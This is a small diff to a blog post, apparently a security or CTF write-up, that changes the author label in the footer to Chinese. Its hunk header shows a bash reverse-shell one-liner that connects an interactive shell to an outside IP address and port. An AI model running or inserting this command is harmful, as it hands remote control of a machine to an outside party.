@@ -149,6 +149,6 @@ bash -c 'exec bash -i &>/dev/tcp/8.130.93.84/3232 <&1'
 
 ---
 
-> Author: [Lunatic](https://goodlunatic.github.io)  
+> 作者: [Lunatic](https://goodlunatic.github.io)  
 > URL: https://goodlunatic.github.io/posts/5de0d7e/  
 
